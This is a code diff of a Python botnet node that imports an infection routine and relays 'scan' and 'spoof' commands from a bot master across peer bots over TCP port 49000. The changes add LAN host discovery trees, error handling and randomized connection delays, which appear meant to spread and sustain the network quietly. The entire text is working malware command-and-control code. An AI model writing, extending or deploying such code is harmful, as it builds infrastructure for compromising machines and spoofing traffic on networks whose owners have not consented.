@@ -4,6 +4,7 @@ import enum
 from infect import main_infect
 import threading
 import socket
+import random
 
 
 # the protocol
@@ -14,9 +15,9 @@ class Types(enum.Enum):
 
 # convert requests to the valid operation
 def convert(choice):
-    if choice == "scan" or choice.find("scan:") != -1 or choice.find("spoof:") != -1 or choice == "get_tree":
+    if choice == "scan" or choice.find("scan:") != -1 or choice.find("spoof:") != -1 or choice == "get_trees":
         return Types.COMMAND
-    elif choice == "scan_result" or choice == "scan_result:" or choice == "spoof_result" or choice == "tree_result":
+    elif choice == "scan_result" or choice == "scan_result:" or choice == "spoof_result" or choice == "trees_result":
         return Types.COMMAND_RESULT
     return None
 
@@ -26,19 +27,12 @@ def handle_command(data, clients, srv):
     if data == "scan":
         parent_conn.send(data)
         clients = parent_conn.recv()
-        # print("IP" + " " * 15 + "MAC")
-        # if clients:
-        #     for client in clients:
-        #         print("{}   {}".format(client['ip'], client['mac']))
-        # else:
-        #     print("scan failed")
         choice = "scan_result"
         return clients, choice
 
     elif data.find("scan:") != -1:
         parent_conn.send(data)
         mac = parent_conn.recv()
-        # print(mac)
         choice = "scan_result:"
         clients.append({'ip': data.split(":")[1], 'mac': mac})
         return mac, choice
@@ -57,9 +51,18 @@ def handle_command(data, clients, srv):
         choice = "spoof_result"
         return result, choice
 
-    elif data == "get_tree":
-        choice = "tree_result"
-        return lan_tree, choice
+    elif data == "get_trees":
+        choice = "trees_result"
+        trees = "recv from: "
+        for receiver in receiver_tree:
+            trees += receiver + " "
+        trees += "\nsending to: "
+        for sender in sender_tree:
+            trees += sender + " "
+        trees += "\nlan: "
+        for host in lan_tree:
+            trees += host + " "
+        return trees, choice
 
 
 # handles all the command's results (sends back to the bot master)
@@ -80,11 +83,11 @@ def handle_command_result(sock, data, output):
     elif data == "spoof_result":
         pass
 
-    elif data == "tree_result":
-        hosts = ""
-        for host in output:
-            hosts += host + " "
-        messages = hosts
+    elif data == "trees_result":
+        messages = output
+
+    else:
+        messages = output
 
 
 # sends to the entire network message to check for other bots
@@ -130,83 +133,92 @@ def ip_list():
     return ips
 
 
+# thread that receives commands from other bots
 def con_thread(sock, addr):
     global messages
     choice = ""
-    data = ""
     output = ""
     clients = []
-    full_cmd = ""
     fc = ""
-    cip = ""
-    forward = False
     http_srv = ""
     while True:
-        forward = False
-        if choice == "":
-            choice = sock.recv(1024).decode()
-            fc = choice
+        try:
+            forward = False
+            if choice == "":
+                choice = sock.recv(1024).decode()
+                fc = choice
 
-        if choice.find("-") != -1:
-            if len(choice.split("-")) == 2:
-                cip = choice.split("-")[1]
-                choice = choice.split("-")[0]
-                if cip != ip:
-                    forward = True
-                    messages = fc
-            elif len(choice.split("-")) == 3:
-                http_srv = choice.split("-")[2]
-                cip = choice.split("-")[1]
-                choice = choice.split("-")[0]
-                if cip != ip:
-                    forward = True
-                    messages = fc
+            if choice.find("-") != -1:
+                if len(choice.split("-")) == 2:
+                    cip = choice.split("-")[1]
+                    choice = choice.split("-")[0]
+                    if cip != ip:
+                        forward = True
+                        choice = ""
+                        messages = fc
+                elif len(choice.split("-")) == 3:
+                    http_srv = choice.split("-")[2]
+                    cip = choice.split("-")[1]
+                    choice = choice.split("-")[0]
+                    if cip != ip:
+                        forward = True
+                        choice = ""
+                        messages = fc
 
-        if not forward:
-            data = choice
-            data_type = convert(choice)
-            choice = ""
-            print(data_type)
-            print(data)
+            if not forward:
+                data = choice
+                data_type = convert(choice)
+                choice = ""
 
-            if not data_type:
-                pass
+                if not data_type:
+                    messages = data
 
-            else:
-                if data_type == Types.COMMAND:
-                    output, choice = handle_command(data, clients, http_srv)
-                elif data_type == Types.COMMAND_RESULT:
-                    handle_command_result(sock, data, output)
+                else:
+                    if data_type == Types.COMMAND:
+                        output, choice = handle_command(data, clients, http_srv)
+                    elif data_type == Types.COMMAND_RESULT:
+                        handle_command_result(sock, data, output)
+        except Exception as ex:
+            receiver_tree.remove(addr[0])
+            return
 
 
+# thread that connects to hosts in lan
 def clients():
     while True:
+        number = 5
         for host in lan_tree:
-            if len(connections) != 3 and host != ip and host not in connections:
-                nc = threading.Thread(target=new_conn, args=(host,))
-                nc.start()
-                connections.append(host)
+            if len(sender_tree) < 6 and host != ip and host not in sender_tree:
+                if len(sender_tree) > 3:
+                    number = random.randint(1, 6)
+                    time.sleep(60)
+                if number == 5:
+                    nc = threading.Thread(target=new_conn, args=(host,))
+                    nc.start()
+                    sender_tree.append(host)
 
 
+# tries to connect to a host and sends to it messages that it gets
 def new_conn(host):
     client_tcp = socket.socket()
     last_msg = ""
     try:
         client_tcp.connect((host, 49000))
-        print("connected to " + host)
-        connections.append(host)
     except:
+        sender_tree.remove(host)
         return
     while True:
-        if messages:
-            msg = messages
-            if last_msg != msg:
-                last_msg = msg
-
-                client_tcp.send(msg.encode())
-                time.sleep(10)
-            else:
-                time.sleep(10)
+        try:
+            if messages:
+                msg = messages
+                if last_msg != msg:
+                    last_msg = msg
+                    client_tcp.send(msg.encode())
+                else:
+                    time.sleep(2)
+        except:
+            sender_tree.remove(host)
+            return
 
 
 if __name__ == '__main__':
@@ -220,7 +232,8 @@ if __name__ == '__main__':
     messages = ""
     ips = ip_list()
     lan_tree = []
-    connections = []
+    sender_tree = []
+    receiver_tree = []
     server_tcp = socket.socket()
 
     send_thread = threading.Thread(target=send_to_network)
@@ -246,9 +259,9 @@ if __name__ == '__main__':
     server_tcp.bind(("0.0.0.0", 49000))
     server_tcp.listen()
 
-    # waiting for command (later receives from bot master)
+    # accepting connections
     while True:
         (client_socket, client_address) = server_tcp.accept()
-        print(client_address)
+        receiver_tree.append(client_address[0])
         con_th = threading.Thread(target=con_thread, args=(client_socket, client_address,))
         con_th.start()
